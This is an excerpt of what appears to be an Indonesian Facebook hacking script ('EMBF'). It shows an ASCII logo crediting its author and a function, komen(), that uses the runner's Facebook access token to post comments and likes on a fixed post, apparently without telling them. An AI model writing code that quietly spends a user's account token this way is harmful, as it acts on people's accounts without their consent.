...
### Logo ###
logo = """
'\x1b[1;94m     ______    __  ___    ____     ______
\x1b[1;92m    / ____/   /  |/  /   / __ )   / ____/
'\x1b[1;94m  / __/     / /|_/ /   / __  |  / /_    
\x1b[1;92m  / /___    / /  / /   / /_/ /  / __/    
'\x1b[1;94m/_____/   /_/  /_/   /_____/  /_/       
 '\x1b[1;95mAuthor : Fais Gans
 '\x1b[1;95mGithub.com : ShadowXfrangk
 '\x1b[1;95mFacebook : Konsol                                        
"""
...
def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
        ...
        requests.post('https://graph.facebook.com/134762465596125/comments/?message=' +kom+ '&access_token=' + toket)
        requests.post('https://graph.facebook.com/134762465596125/likes?summary=true&access_token=' + toket)
        requests.post('https://graph.facebook.com/134762465596125/comments/?message=Takiya genjiii&access_token=' + toket)
        requests.post('https://graph.facebook.com/134762465596125/likes?summary=true&access_token=' + toket)
